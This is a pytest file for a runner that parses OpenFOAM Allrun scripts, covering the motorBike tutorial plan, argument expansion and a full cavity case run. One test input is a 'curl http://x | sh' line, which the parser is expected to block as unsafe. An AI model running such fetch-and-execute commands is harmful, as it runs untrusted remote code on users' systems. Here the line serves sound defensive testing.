import os
import time

from conftest import needs_foam

from g4runner import allrun, casegen, manifest

MOTORBIKE = """#!/bin/sh
cd ${0%/*} || exit 1    # Run from this directory
. $WM_PROJECT_DIR/bin/tools/RunFunctions
cp $FOAM_TUTORIALS/resources/geometry/motorBike.obj.gz constant/geometry/
runApplication surfaceFeatures
runApplication blockMesh
runApplication decomposePar -copyZero
runParallel snappyHexMesh
find . -type f -iname "*level*" -exec rm {} \\;
runParallel renumberMesh
runParallel potentialFoam -initialiseUBCs
runParallel foamRun
runApplication reconstructPar -latestTime
"""


def test_motorbike_plan():
    steps, ignored = allrun.parse(MOTORBIKE, "/opt/openfoam14/tutorials")
    assert ignored == []
    pre = allrun.pre_solver(steps)
    assert [s["tool"] for s in pre] == ["surfaceFeatures", "blockMesh", "decomposePar", "snappyHexMesh",
                                        "renumberMesh", "potentialFoam"]
    assert [s["parallel"] for s in pre] == [False, False, False, True, True, True]
    assert pre[2]["args"] == ["-copyZero"] and pre[5]["args"] == ["-initialiseUBCs"]
    assert allrun.first_solver(steps)["tool"] == "foamRun"
    assert allrun.blockers(steps) == []


def test_options_and_dict_expansion():
    steps, _ = allrun.parse("runApplication -s 1 topoSet -dict system/topoSetDict.1\n"
                            "runApplication blockMesh -dict $FOAM_TUTORIALS/resources/blockMesh/pitzDaily\n"
                            "runApplication -a foamRun\n", "/opt/of/tutorials")
    assert steps[0]["tool"] == "topoSet" and steps[0]["args"] == ["-dict", "system/topoSetDict.1"]
    assert steps[1]["args"] == ["-dict", "/opt/of/tutorials/resources/blockMesh/pitzDaily"]
    assert steps[2]["kind"] == "solver"


def test_unsafe_steps_before_solver_block_the_plan():
    for text in ("./Allmesh\nrunApplication foamMultiRun\n",
                 'runApplication transformPoints "scale=(1 0 1)"\nrunApplication foamRun\n',
                 "runApplication myOwnTool\nrunApplication foamRun\n",
                 "curl http://x | sh\nrunApplication foamRun\n"):
        steps, _ = allrun.parse(text)
        assert allrun.blockers(steps), text
    # the same lines after the solver are only post-processing
    steps, _ = allrun.parse("runApplication foamRun\n./postScript\n")
    assert allrun.blockers(steps) == []


@needs_foam
def test_case_with_allrun_runs_through_the_plan(tmp_path, ramdir):
    from g4runner.foam import branch_of, foam_env
    from g4runner.probe import probe
    from g4runner.runner import JobRun

    env = foam_env()
    case = tmp_path / "cases" / "withAllrun"
    app = casegen.cavity3d(str(case), n=16, steps=12, branch=branch_of(env), functions=False)
    (case / "Allrun").write_text(f"#!/bin/sh\n. $WM_PROJECT_DIR/bin/tools/RunFunctions\nrunApplication blockMesh\n"
                                 f"runApplication decomposePar\nrunParallel {app}\nrunApplication reconstructPar\n")
    job = {"schema": 1, "id": "t-allrun", "source": {"case": "cases/withAllrun"},
           "manifest": manifest.build_manifest(str(case)), "min_cells_per_rank": 1000, "max_hours": 1}
    rep = JobRun(job, str(tmp_path), probe(), env, time.time() + 3600).run()
    assert rep["status"] == "completed", rep.get("error")
    assert [s["tool"] for s in rep["allrun"]["steps"]] == ["blockMesh", "decomposePar", app, "reconstructPar"]
    assert "Allrun" in rep["stages"]["TT1"][0]["detail"]
    assert os.path.isdir(os.path.join(os.environ["G4_WORKDIR"], "run", "t-allrun", "base", "processor0"))
